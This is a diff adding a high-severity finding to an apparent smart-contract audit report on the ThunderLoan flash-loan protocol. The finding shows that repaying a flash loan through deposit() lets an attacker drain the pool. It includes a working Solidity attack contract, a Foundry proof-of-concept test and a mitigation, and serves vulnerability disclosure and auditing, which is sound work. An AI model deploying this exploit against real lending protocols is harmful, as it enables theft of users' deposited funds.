@@ -69,6 +69,128 @@ However, the 'deposit' function, updates this rate, without collecting any fees!
 
 ```
 
+### [H-2] All the funds can be stolen if the flash loan is returned using deposit()
+
+**Description:** The flashloan() performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing endingBalance with startingBalance + fee. However, a vulnerability emerges when calculating endingBalance using token.balanceOf(address(assetToken)).
+
+Exploiting this vulnerability, an attacker can return the flash loan using the deposit() instead of repay(). This action allows the attacker to mint AssetToken and subsequently redeem it using redeem(). What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.
+
+**Impact:** All the funds of the AssetContract can be stolen.
+
+**Proof of Concept:** To execute the test successfully, please complete the following steps:
+
+1. Place the **`attack.sol`** file within the mocks folder.
+1. Import the contract in **`ThunderLoanTest.t.sol`**.
+1. Add **`testattack()`** function in **`ThunderLoanTest.t.sol`**.
+1. Change the **`setUp()`** function in **`ThunderLoanTest.t.sol`**.
+
+```Solidity
+import { Attack } from "../mocks/attack.sol";
+```
+
+```Solidity
+function testattack() public setAllowedToken hasDeposits {
+        uint256 amountToBorrow = AMOUNT * 10;
+        vm.startPrank(user);
+        tokenA.mint(address(attack), AMOUNT);
+        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
+        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
+        thunderLoan.redeem(tokenA, type(uint256).max);
+        vm.stopPrank();
+
+        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);
+    }
+```
+
+```Solidity
+function setUp() public override {
+        super.setUp();
+        vm.prank(user);
+        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
+        vm.prank(user);
+        attack = new Attack(address(thunderLoan));
+    }
+```
+
+attack.sol
+
+```Solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
+
+interface IThunderLoan {
+    function repay(address token, uint256 amount) external;
+    function deposit(IERC20 token, uint256 amount) external;
+    function getAssetFromToken(IERC20 token) external;
+}
+
+
+contract Attack {
+    error MockFlashLoanReceiver__onlyOwner();
+    error MockFlashLoanReceiver__onlyThunderLoan();
+
+    using SafeERC20 for IERC20;
+
+    address s_owner;
+    address s_thunderLoan;
+
+    uint256 s_balanceDuringFlashLoan;
+    uint256 s_balanceAfterFlashLoan;
+
+    constructor(address thunderLoan) {
+        s_owner = msg.sender;
+        s_thunderLoan = thunderLoan;
+        s_balanceDuringFlashLoan = 0;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address initiator,
+        bytes calldata /*  params */
+    )
+        external
+        returns (bool)
+    {
+        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
+
+        if (initiator != s_owner) {
+            revert MockFlashLoanReceiver__onlyOwner();
+        }
+
+        if (msg.sender != s_thunderLoan) {
+            revert MockFlashLoanReceiver__onlyThunderLoan();
+        }
+        IERC20(token).approve(s_thunderLoan, amount + fee);
+        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
+        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
+        return true;
+    }
+
+    function getbalanceDuring() external view returns (uint256) {
+        return s_balanceDuringFlashLoan;
+    }
+
+    function getBalanceAfter() external view returns (uint256) {
+        return s_balanceAfterFlashLoan;
+    }
+
+    function sendAssetToken(address assetToken) public {
+
+        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
+    }
+}
+```
+
+Notice that the **`assetLt()`** checks whether the balance of the AssetToken contract is less than the **`DEPOSIT_AMOUNT`**, which represents the initial balance. The contract balance should never decrease after a flash loan, it should always be higher.
+
+**Recommended Mitigation:** Add a check in deposit() to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in flashloan() and checking it in deposit().
+
 ## Medium
 
 ### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attack
